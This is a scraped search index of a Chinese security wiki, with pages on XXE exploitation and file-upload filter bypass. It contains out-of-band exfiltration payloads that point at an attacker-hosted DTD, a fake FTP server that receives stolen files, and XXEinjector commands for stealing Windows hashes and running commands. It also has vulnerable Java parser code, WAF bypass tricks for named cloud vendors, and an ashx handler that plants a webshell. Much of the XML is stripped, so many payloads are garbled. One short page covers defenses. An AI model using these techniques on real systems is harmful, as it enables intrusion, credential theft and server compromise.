window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/XXE/3.html":{"url":"安全技术/XXE/3.html","title":"XML外部实体的一些限制与解决办法","keywords":"","body":"XML外部实体的一些限制与解决办法 error 通常对于XXE的经典用法，用来读取文件比较直接方便，但是，也决定了能被解析的内容元素必须是XML文档。 如下面一个例子： request: POST http://example.com/xml HTTP/1.1 ; ]> &bar; response: 通常会得到如下响应 HTTP/1.0 500 Internal Server Error File \"file:///etc/fstab\", line 3 lxml.etree.XMLSyntaxError: Specification mandate value for attribute system, line 3, column 15... /etc/fstab是一个包含一些看起来像XML的字符的文件（即使它们不是XML）。这将导致XML解析器尝试解析这些元素，只是注意到它不是有效的XML文档。 因此，这限制了XML外部实体（XXE）在以下两个重要方面。 XXE只能用于获取包含“有效”XML的文件或响应 XXE不能用于获取二进制文件 XML外部实体（XXE）限制解决办法 这其实也就用到了外部参数实体，解决了命名实体和普通实体所带来的一些问题。具体如下分析： 攻击者可以通过使用一些巧妙的技巧来解决上述限制。攻击者使用XML外部实体（XXE）攻击所面临的主要问题是，它很容易撞了南墙试图exfiltrate不是有效的XML文件（包含XML特殊字符，如例如，文件明文文件时&，）。 理论上的解决办法 XML已经解决了这个问题，因为有些合法的情况可能需要在XML文件中存储XML特殊字符。CDATAXML解析器忽略（Character Data）标记中的特殊XML字符。 characters are ok in here ]]> 因此，从理论上讲，攻击者可以发送类似于以下内容的请求。 request: POST http://example.com/xml HTTP/1.1 \"> ]> &all; 预期response: HTTP/1.0 200 OK # /etc/fstab: static file system informa... # # ... proc /proc proc defaults 0 0 # /dev/sda5 UUID=be35a709-c787-4198-a903-d5fdc80ab2f... # /dev/sda6 UUID=cee15eca-5b2e-48ad-9735-eae5ac14bc9... /dev/scd0 /media/cdrom0 udf,iso9660 ... 但实际上并不起作用，因为XML规范不允许将外部实体与内部实体结合使用。 内部实体代码示例： ]> 外部实体代码示例： ]> &xxe; mypass 参数实体 然而，攻击者仍然可以扔出手里的另一张牌—参数实体，在得到以上限制解决方法之前先理解一下以下两个重点： 重点一： 实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码： 还是以上代码 ]> &xxe; mypass 重点二： 我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体） 通用实体： 用 &实体名:引用的实体，他在DTD 中定义，在 XML 文档中引用 示例代码： ]> &outfile; 参数实体： (1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 \\%实体名; *引用* (2)只有在 DTD 文件中，参数实体的声明才能引用其他实体 (3)和通用实体一样，参数实体也可以外部引用 示例代码： \"> %an-element; %remote-dtd; 参数实体在我们 Blind XXE 中起到了至关重要的作用 接下来怎么做？（解决办法） 除了一般实体，这是我们到目前为止所看到的，还有参数实体。 以下是参数实体的外观。它与一般实体相同，除了它存在于DTD内部并以％作为前缀开始，以指示XML解析器正在定义参数实体（不是通用实体）。在下面的示例中，参数实体用于定义通用实体，然后在XML文档内部调用该实体。 request: POST http://example.com/xml HTTP/1.1 \"> %paramEntity; ]> &genEntity; 预期的response: HTTP/1.0 200 OK bar 考虑到上面的示例，攻击者现在可以通过创建在attacker.com/evil.dtd上托管的恶意DTD，将上面的理论CDATA示例转换为工作攻击。 request: POST http://example.com/xml HTTP/1.1 %dtd; %all; ]> &fileContents; 攻击者DTD（attacker.com/evil.dtd） \"> \"> 解析： 当攻击者发送上述请求时，XML解析器将首先%dtd通过向http://attacker.com/evil.dtd发出请求来尝试处理参数实体。 一旦下载了攻击者的DTD，XML解析器将加载%file参数实体（来自evil.dtd），在本例中是/etc/fstab。然后它将分别`使用%start和%end参数实体将文件的内容包装在标签中，并将它们存储在另一个名为的参数实体中%all`。 这个技巧的核心是%all创建一个被调用的通用实体&fileContents;，它可以作为响应的一部分包含在攻击者中。 注:攻击者可以只使用DTD内参数实体，而不是内部的XML文档） 结果是回复攻击者，文件（/etc/fstab）的内容包含在CDATA标签中。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 14:46:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/XXE/4.html":{"url":"安全技术/XXE/4.html","title":"XXE 有回显利用方式总结","keywords":"","body":"XXE 有回显利用方式总结 结合外部实体声明（实体名称 SYSTEM ”uri/url“）和参数实体（% 实体名称 SYSTEM “uri-外部dtd”）有两种方式进行注入攻击 姿势一 ]> &xxe; 姿势二 %xxe;]> &evil; 外部evil.dtd的内容 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 14:48:23 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/XXE/5.html":{"url":"安全技术/XXE/5.html","title":"XXE 无回显利用方式总结","keywords":"","body":"XXE 无回显利用方式总结 可以使用外带数据通道提取数据，先用file://或php://filter获取目标文件的内容，然后将内容以http请求发送到接收数据的服务器（攻击服务器） %dtd; %send; ]> evil.dtd的内容，内部的%号要进行实体编码成%。 \" > %all; 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 14:49:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/XXE/6.html":{"url":"安全技术/XXE/6.html","title":"XXE XXE审计函数","keywords":"","body":"XXE审计函数 XML解析一般在导入配置、数据传输接口等场景可能会用到，涉及到XML文件处理的场景可查看XML解析器是否禁用外部实体，从而判断是否存在XXE。部分XML解析接口（常见漏洞出现函数）如下： JAVA javax.xml.parsers.DocumentBuilderFactory; javax.xml.parsers.SAXParser javax.xml.transform.TransformerFactory javax.xml.validation.Validator javax.xml.validation.SchemaFactory javax.xml.transform.sax.SAXTransformerFactory javax.xml.transform.sax.SAXSource org.xml.sax.XMLReader DocumentHelper.parseText DocumentBuilder org.xml.sax.helpers.XMLReaderFactory org.dom4j.io.SAXReader org.jdom.input.SAXBuilder org.jdom2.input.SAXBuilder javax.xml.bind.Unmarshaller javax.xml.xpath.XpathExpression javax.xml.stream.XMLStreamReader org.apache.commons.digester3.Digester rg.xml.sax.SAXParseExceptionpublicId PHP 使用不安全的XML解析函数，SimpleXMLElement、simplexml_load_string函数解析body 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 14:51:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/XXE/7.html":{"url":"安全技术/XXE/7.html","title":"Blind XXE 与 OOB-XXE","keywords":"","body":"XXE漏洞代码示例 JAVA JAVA解析XML的方法越来越多，常见有四种，即：DOM、DOM4J、JDOM 和SAX。下面以这四种为例展示XXE漏洞。 1）DOM Read XML protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String result=\"\"; try { //DOM Read XML DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); Document doc = db.parse(request.getInputStream()); String username = getValueByTagName(doc,\"username\"); String password = getValueByTagName(doc,\"password\"); if(username.equals(USERNAME) && password.equals(PASSWORD)){ result = String.format(\"%d%s\",1,username); }else{ result = String.format(\"%d%s\",0,username); } } catch (ParserConfigurationException e) { e.printStackTrace(); result = String.format(\"%d%s\",3,e.getMessage()); } catch (SAXException e) { e.printStackTrace(); result = String.format(\"%d%s\",3,e.getMessage()); } response.setContentType(\"text/xml;charset=UTF-8\"); response.getWriter().append(result); } 2)DOM4J Read XML protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String result=\"\"; try { //DOM4J Read XML SAXReader saxReader = new SAXReader(); Document document = saxReader.read(request.getInputStream()); String username = getValueByTagName2(document,\"username\"); String password = getValueByTagName2(document,\"password\"); if(username.equals(USERNAME) && password.equals(PASSWORD)){ result = String.format(\"%d%s\",1,username); }else{ result = String.format(\"%d%s\",0,username); } } catch (DocumentException e) { System.out.println(e.getMessage()); } response.setContentType(\"text/xml;charset=UTF-8\"); response.getWriter().append(result); } 3)JDOM2 Read XML protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String result=\"\"; try { //JDOM2 Read XML SAXBuilder builder = new SAXBuilder(); Document document = builder.build(request.getInputStream()); String username = getValueByTagName3(document,\"username\"); String password = getValueByTagName3(document,\"password\"); if(username.equals(USERNAME) && password.equals(PASSWORD)){ result = String.format(\"%d%s\",1,username); }else{ result = String.format(\"%d%s\",0,username); } } catch (JDOMException e) { System.out.println(e.getMessage()); } response.setContentType(\"text/xml;charset=UTF-8\"); response.getWriter().append(result); } 4)SAX Read XML protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //https://blog.csdn.net/u011024652/article/details/51516220 String result=\"\"; try { //SAX Read XML SAXParserFactory factory = SAXParserFactory.newInstance(); SAXParser saxparser = factory.newSAXParser(); SAXHandler handler = new SAXHandler(); saxparser.parse(request.getInputStream(), handler); //为简单，没有提取子元素中的数据，只要调用parse()解析xml就已经触发xxe漏洞了 //没有回显 blind xxe result = String.format(\"%d%s\",0,1); } catch (ParserConfigurationException e) { e.printStackTrace(); result = String.format(\"%d%s\",3,e.getMessage()); } catch (SAXException e) { e.printStackTrace(); result = String.format(\"%d%s\",3,e.getMessage()); } response.setContentType(\"text/xml;charset=UTF-8\"); response.getWriter().append(result); } 其他： 0x1: public class XXE { @RequestMapping(value = \"/xmlReader\", method = RequestMethod.POST) @ResponseBody public String xxe_xmlReader(HttpServletRequest request) { try { String xml_con = getBody(request); System.out.println(xml_con); XMLReader xmlReader = XMLReaderFactory.createXMLReader(); xmlReader.parse( new InputSource(new StringReader(xml_con)) ); // parse xml return \"ok\"; } catch (Exception e) { System.out.println(e); return \"except\"; } } 0x2: @RequestMapping(value = \"/SAXBuilder\", method = RequestMethod.POST) @ResponseBody public String xxe_SAXBuilder(HttpServletRequest request) { try { String xml_con = getBody(request); System.out.println(xml_con); SAXBuilder builder = new SAXBuilder(); org.jdom2.Document document = builder.build( new InputSource(new StringReader(xml_con)) ); // cause xxe return \"ok\"; } catch (Exception e) { System.out.println(e); return \"except\"; } } 0x3: @RequestMapping(value = \"/SAXReader\", method = RequestMethod.POST) @ResponseBody public String xxe_SAXReader(HttpServletRequest request) { try { String xml_con = getBody(request); System.out.println(xml_con); SAXReader reader = new SAXReader(); org.dom4j.Document document = reader.read( new InputSource(new StringReader(xml_con)) ); // cause xxe return \"ok\"; } catch (Exception e) { System.out.println(e); return \"except\"; } } 0x4: @RequestMapping(value = \"/SAXParser\", method = RequestMethod.POST) @ResponseBody public String xxe_SAXParser(HttpServletRequest request) { try { String xml_con = getBody(request); System.out.println(xml_con); SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser parser = spf.newSAXParser(); parser.parse(new InputSource(new StringReader(xml_con)), new DefaultHandler()); // parse xml return \"test\"; } catch (Exception e) { System.out.println(e); return \"except\"; } } 0x5: // 有回显的XXE @RequestMapping(value = \"/DocumentBuilder_return\", method = RequestMethod.POST) @ResponseBody public String xxeDocumentBuilderReturn(HttpServletRequest request) { try { String xml_con = getBody(request); System.out.println(xml_con); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(xml_con); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml // 遍历xml节点name和value StringBuffer buf = new StringBuffer(); NodeList rootNodeList = document.getChildNodes(); for (int i = 0; i PHP 如： loadXML($aa, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $user = $creds->user; ?> 08067 textarea{ resize:none; width:400px; height:200px;margin:10px auto;} user 注：该段代码取自某ctf 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 14:56:50 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/XXE/8.html":{"url":"安全技术/XXE/8.html","title":"Blind XXE 原理","keywords":"","body":"Blind XXE 与 OOB-XXE 一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象（带内 XML外部实体（XXE），即攻击者可以发送带有XXE有效负载的请求并从包含某些数据的Web应用程序获取响应），无回显的情况又称为blind xxe，可以使用外带数据通道提取数据即带外XML外部实体（OOB-XXE）。 以下是攻击者如何利用参数实体使用带外（OOB）技术窃取数据的示例。 request: POST http://example.com/xml HTTP/1.1 %dtd; ]> &send; 攻击者DTD \"> %all; XML解析器将首先处理%file加载文件的参数实体/etc/lsb-release。接下来，XML解析器将在http://www.0-sec.org/evil.dtd向攻击者的DTD发出请求。 一旦处理了攻击者的DTD，all%参数实体将创建一个名为＆send的通用实体; ，其中包含一个包含文件内容的URL（例如http://www.0-sec.org/?collect=DISTRIB_ID=Ubuntu …）。最后，一旦URL构造的&send; 实体由解析器处理，解析器向攻击者的服务器发出请求。然后，攻击者可以在其结尾处记录请求，并从记录的请求中重建文件的内容。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 15:05:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/XXE/9.html":{"url":"安全技术/XXE/9.html","title":"XXE 利用","keywords":"","body":"Blind XXE 原理 带外数据通道的建立是使用嵌套形式，利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系。 直接在内部实体定义中引用另一个实体的方法如下，但是这种方法行不通。 %param2; ]> 于是考虑内部实体嵌套的形式： \"> %param2; ]> 但是这样做行不通，原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。 解决方案是： 将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。 如下： payload %remote; %all; ]> 【evil.xml】 \"> nc -lvv port 监听即可获得请求回显内容 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 15:05:20 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/XXE/13.html":{"url":"安全技术/XXE/13.html","title":"XXEinjector 自动化XXE注射工具","keywords":"","body":"XXEinjector 自动化XXE注射工具 https://github.com/ianxtianxt/XXEinjector XXEinjector本身提供了非常非常丰富的操作选项，所以大家在利用XXEinjector进行渗透测试之前，请自习了解这些配置选项，以最大限度地发挥XXEinjector的功能。当然了，由于XXEinjector是基于Ruby开发的，所以Ruby运行环境就是必须的了。 --host 必填项– 用于建立反向链接的IP地址。(--host=192.168.0.2) --file 必填项- 包含有效HTTP请求的XML文件。(--file=/tmp/req.txt) --path 必填项-是否需要枚举目录 – 枚举路径。(--path=/etc) --brute 必填项-是否需要爆破文件 -爆破文件的路径。(--brute=/tmp/brute.txt) --logger 记录输出结果。 --rhost 远程主机IP或域名地址。(--rhost=192.168.0.3) --rport 远程主机的TCP端口信息。(--rport=8080) --phpfilter 在发送消息之前使用PHP过滤器对目标文件进行Base64编码。 --netdoc 使用netdoc协议。(Java). --enumports 枚举用于反向链接的未过滤端口。(--enumports=21,22,80,443,445) --hashes 窃取运行当前应用程序用户的Windows哈希。 --expect 使用PHP expect扩展执行任意系统命令。(--expect=ls) --upload 使用Java jar向临时目录上传文件。(--upload=/tmp/upload.txt) --xslt XSLT注入测试。 --ssl 使用SSL。 --proxy 使用代理。(--proxy=127.0.0.1:8080) --httpport Set自定义HTTP端口。(--httpport=80) --ftpport 设置自定义FTP端口。(--ftpport=21) --gopherport 设置自定义gopher端口。(--gopherport=70) --jarport 设置自定义文件上传端口。(--jarport=1337) --xsltport 设置自定义用于XSLT注入测试的端口。(--xsltport=1337) --test 该模式可用于测试请求的有效。 --urlencode URL编码，默认为URI。 --output 爆破攻击结果输出和日志信息。(--output=/tmp/out.txt) --timeout 设置接收文件/目录内容的Timeout。(--timeout=20) --contimeout 设置与服务器断开连接的，防止DoS出现。(--contimeout=20) --fast 跳过枚举询问，有可能出现结果假阳性。 --verbose 显示verbose信息。 XXEinjector使用样例 枚举HTTPS应用程序中的/etc目录： ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt –ssl 使用gopher（OOB方法）枚举/etc目录： ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher 二次漏洞利用： ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt 使用HTTP带外方法和netdoc协议对文件进行爆破攻击： ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http –netdoc 通过直接性漏洞利用方式进行资源枚举： ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK 枚举未过滤的端口： ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all 窃取Windows哈希： ruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt –hashes 使用Java jar上传文件： ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf 使用PHP expect执行系统指令： ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls 测试XSLT注入： ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt –xslt 记录请求信息： ruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 16:30:33 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/XXE/11.html":{"url":"安全技术/XXE/11.html","title":"XXE 审计与利用思路","keywords":"","body":"XXE 审计与利用思路 第一处出现在系统使用的org.dom4j.DocumentHelper调用的类函数下。 在源码中搜索关键字DocumentHelper.parseText 得到： \\xxx\\***\\***.java Line 303: document = DocumentHelper.parseText(xml); \\xxx\\***\\XmlParser.java Line 51: Document doc = DocumentHelper.parseText(xmlStr); \\\\xxx\\***\\***Task.java Line 350: Document document = DocumentHelper.parseText(result); \\\\xxx\\***\\***Action.java Line 237: Document document = DocumentHelper.parseText(mapDataForOut); \\\\xxx\\***\\xxxAction.java Line 259: Document document = DocumentHelper.parseText(mapDataForOut); \\\\xxx\\***\\xxx.java Line 120: Document doc = DocumentHelper.parseText(policyXml.replaceAll(\"_lnx\", \"\")); Line 125: doc = DocumentHelper.parseText(node.asXML()); \\\\xxx\\***tion.java Line 109: Document doc = DocumentHelper.parseText(xmlStr); \\\\xxx\\***.java Line 58: doc = DocumentHelper.parseText(xml); // 将字符串转为XML \\xxx\\***.java Line 92: doc = DocumentHelper.parseText(xml); Line 97: oldDoc = DocumentHelper.parseText(vaildXml); \\\\xxx\\***ObjConverter.java Line 173: Document document = DocumentHelper.parseText(xml); \\\\xxx\\***.java Line 949: doc = DocumentHelper.parseText(infor.getContent()); \\\\xxx\\***Utility.java Line 1203: Document doc = DocumentHelper.parseText(result); \\\\xxx\\***xxxService.java Line 177: Document doc = DocumentHelper.parseText(requestHeader); \\xxx\\***\\EventParser.java Line 83: Document doc = DocumentHelper.parseText(xmlStr); Line 185: Document doc = DocumentHelper.parseText(xmlStr); Line 229: Document doc = DocumentHelper.parseText(xmlStr); Line 306: DocumentHelper.parseText(contentXml)).replaceAll(\"\", \"&gt;\").replaceAll(\"==amp;\", \\\\xxx\\***\\XMLMessageUtil.java Line 24: doc = DocumentHelper.parseText(xml); Line 131: tempDoc = DocumentHelper.parseText(xml); Line 224: document = DocumentHelper.parseText(\"\"); \\xxx\\***\\XmlParser.java Line 51: Document doc = DocumentHelper.parseText(xmlStr); \\\\xxx\\***.java Line 244: Document doc = DocumentHelper.parseText(xmlStr); 其中，\\xxx\\***\\XMLMessageUtil.java 代码中 使用org.dom4j.DocumentHelper.parseTest解析XML文件 第二处，发现位置是在查看web.xml文件中AxisServlet的servlet-mapping配置，发现URL地址包含以下路径或后缀就可被攻击利用 ***\\WebRoot\\WEB-INF\\web.xml xxx\\***\\WebRoot\\WEB-INF\\web.xml AxisServlet /servlet/AxisServlet AxisServlet *.jws AxisServlet /services/* 在通过访问以下URL即可访问到AxisServlet服务，可对其进行XXE漏洞攻击。 https://www.0-sec.org/xxx/servlet/AxisServlet https://www.0-sec.org/***/servlet/AxisServlet poc 0x1: 在复现时由于目标主机无法访问外网，所以需要在本地主机上搭建测试环境，具体的复现过程如下（嗯额这里感谢一下同事）： 1）新建目录xxe_test，复制下面文件放入 test.dtd \"> 2)在xxe_test目录下运行如下命令，监听8080端口（检查防火墙是否开放该端口） Python -m SimpleHTTPServer 8080 3)运行以下脚本，启动ftp服务器（检查防火墙是否开放21端口） Python xxe-ftp.py #!/usr/env/python from __future__ import print_function import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) s.bind(('0.0.0.0',21)) s.listen(1) print('XXE-FTP listening ') conn,addr = s.accept() print('Connected by %s',addr) conn.sendall('220 Staal XXE-FTP\\r\\n') stop = False while not stop: dp = str(conn.recv(1024)) if dp.find(\"USER\") > -1: conn.sendall(\"331 password please - version check\\r\\n\") else: conn.sendall(\"230 more data please!\\r\\n\") if dp.find(\"RETR\")==0 or dp.find(\"QUIT\")==0: stop = True if dp.find(\"CWD\") > -1: print(dp.replace('CWD ','/',1).replace('\\r\\n',''),end='') else: print(dp) conn.close() s.close() 4)发送以下报文： POST /xxx/*** HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: application/json, text/javascript, */* Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 X-Requested-With: XMLHttpRequest Referer: https://target_ip/xxx/***.jsp ContentType: pplication/x-www-form-urlencoded Cookie: JSESSIONID=WwV5E_ZpZVWhnIKEaFuuphs1.localhost; ops.cookie.principal=xxxxx DNT: 1 Connection: close Content-Type: text/xml Content-Length: 159 %sp; %param3; %exfil; ]> 漏洞截图： 0x1: 成功获取到受害主机的/etc/shadow文件 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 15:13:33 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/XXE/12.html":{"url":"安全技术/XXE/12.html","title":"XXE 防御","keywords":"","body":"XXE 防御 使用语言中推荐的禁用外部实体的方法 PHP： libxml_disable_entity_loader(true); JAVA: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); .setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true); .setFeature(\"http://xml.org/sax/features/external-general-entities\",false) .setFeature(\"http://xml.org/sax/features/external-parameter-entities\",false); Python： from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 15:13:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/上传绕过/上传绕过总结.html":{"url":"安全技术/上传绕过/上传绕过总结.html","title":"上传绕过总结","keywords":"","body":"上传绕过整理 WAF绕过 安全狗绕过 1.绕过思路：对文件的内容，数据。数据包进行处理。 关键点在这里Content-Disposition: form-data; name=\"file\"; filename=\"ian.php\" 将form-data; 修改为~form-data; 2.通过替换大小写来进行绕过 Content-Disposition: form-data; name=\"file\"; filename=\"yjh.php\" Content-Type: application/octet-stream 将Content-Disposition 修改为content-Disposition 将 form-data 修改为Form-data 将 Content-Type 修改为content-Type 3.通过删减空格来进行绕过 Content-Disposition: form-data; name=\"file\"; filename=\"yjh.php\" Content-Type: application/octet-stream 将Content-Disposition: form-data 冒号后面 增加或减少一个空格 将form-data; name=\"file\"; 分号后面 增加或减少一个空格 将 Content-Type: application/octet-stream 冒号后面 增加一个空格 4.通过字符串拼接绕过 看Content-Disposition: form-data; name=\"file\"; filename=\"yjh3.php\" 将 form-data 修改为 f+orm-data 将 from-data 修改为 form-d+ata 5.双文件上传绕过 6.HTTP header 属性值绕过 Content-Disposition: form-data; name=\"file\"; filename=\"yjh.php\" 我们通过替换form-data 为*来绕过 Content-Disposition: *; name=\"file\"; filename=\"yjh.php\" 7.HTTP header 属性名称绕过 源代码: Content-Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png\"Content-Type: image/png 绕过内容如下： Content-Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png C.php\" 删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php\". 8.等效替换绕过 原内容： Content-Type: multipart/form-data; boundary=---------------------------471463142114 修改后: Content-Type: multipart/form-data; boundary =---------------------------471463142114 boundary后面加入空格。 9.修改编码绕过 使用UTF-16、Unicode、双URL编码等等 WTS-WAF 绕过上传 原内容： Content-Disposition: form-data; name=\"up_picture\"; filename=\"xss.php\" 添加回车 Content-Disposition: form-data; name=\"up_picture\"; filename=\"xss.php\" 百度云上传绕过 百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。 Content-Disposition: form-data; name=\"up_picture\"; filename=\"xss.jpg .Php\" 阿里云上传绕过 源代码： Content-Disposition: form-data; name=\"img_crop_file\"; filename=\"1.jpg .Php\"Content-Type: image/jpeg 修改如下： Content-Disposition: form-data; name=\"img_crop_file\"; filename=\"1.php\" 没错，将=号这里回车删除掉Content-Type: image/jpeg即可绕过。 360主机上传绕过 源代码: Content-Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png\"Content-Type: image/png 绕过内容如下： Content- Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png Content-Disposition 修改为 Content-空格Disposition MIME类型绕过 上传木马时，提示格式错误。直接抓包修改Content-Type 为正确的格式尝试绕过 文件内容检测绕过 抓包，在正常图片末尾添加一句话木马 多次上传Win特性绕过 多次上传同一个文件，windows会自动更新补全TEST (1).php。 有时会触发条件竞争，导致绕过。 条件竞争绕过 通过BURP不断发包，导致不断写入Webshell，再写入速度频率上超过安全软件查杀频率，导致绕过。 CONTENT-LENGTH绕过 针对这种类型的验证，我们可以通过上传一些非常短的恶意代码来绕过。上传文件的大小取决于，Web服务器上的最大长度限制。我们可以使用不同大小的文件来fuzzing上传程序，从而计算出它的限制范围。 文件内容检测绕过 针对文件内容检测的绕过，一般有两种方式， 1.制作图片马 2.文件幻术头绕过 垃圾数据填充绕过 修改HTTP请求，再之中加入大量垃圾数据。 黑名单后缀绕过 文件扩展名绕过 Php除了可以解析php后缀 还可以解析php2.php3，php4 后缀 ashx上传绕过 cer,asa,cdx等等无法使用时候。 解析后就会生成一个test.asp的马，你就可以连接这个test.asp 密码为:put using System; using System.Web; using System.IO; public class Handler : IHttpHandler { public void ProcessRequest (HttpContext context) { context.Response.ContentType = \"text/plain\"; //这里会在目录下生成一个test.asp的文件 StreamWriter file1= File.CreateText(context.Server.MapPath(\"test.asp\")); //这里是写入一句话木马 密码是：ptu file1.Write(\"\"); file1.Flush(); file1.Close(); } public bool IsReusable { get { return false; } } } 特殊文件名绕过 比如发送的 http包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式 在windows系统里是不被允许的，所以需要在 burp之类里进行修改，然后绕过验证后，会 被windows系统自动去掉后面的点和空格，但要注意Unix/Linux系统没有这个特性。 Windows流特性绕过 php在windows的时候如果文件名+\"::$DATA\"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::$DATA\"之前的文件名。 白名单后缀绕过 00截断绕过上传 php .jpg 空格二进制20改为00 IIS 6.0 目录路径检测解析绕过 上传路径改为 XXX/1.asp/ htaccess解析漏洞 上传的jpg文件都会以php格式解析 .htaccess内容： AddType application/x-httpd-php .jpg 突破MIME限制上传 方法：找一个正常的可上传的查看其的MIME类型，然后将马子的MIME改成合法的MIME即可。 Apache解析漏洞 1.一个文件名为test.x1.x2.x3的文件，apache会从x3的位置开始尝试解析，如果x3不属于apache能够解析的扩展名，那么apache会尝试去解析x2，直到能够解析到能够解析的为止，否则就会报错。 2.CVE-2017-15715，这个漏洞利用方式就是上传一个文件名最后带有换行符(只能是\\x0A，如上传a.php，然后在burp中修改文件名为a.php\\x0A)，以此来绕过一些黑名单过滤。 IIS解析漏洞 IIS6.0在解析asp格式的时候有两个解析漏洞，一个是如果目录名包含\".asp\"字符串， 那么这个目录下所有的文件都会按照asp去解析，另一个是只要文件名中含有\".asp;\" 会优先按asp来解析 IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL 后面追加上字符串\"/任意文件名.php\"就会按照php的方式去解析； Nginx解析漏洞 解析： (任意文件名)/(任意文件名).php | (任意文件名)%00.php 描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php 的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。 还有一种是对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。 解析漏洞 Content-Disposition: form-data; name=\"file\"; 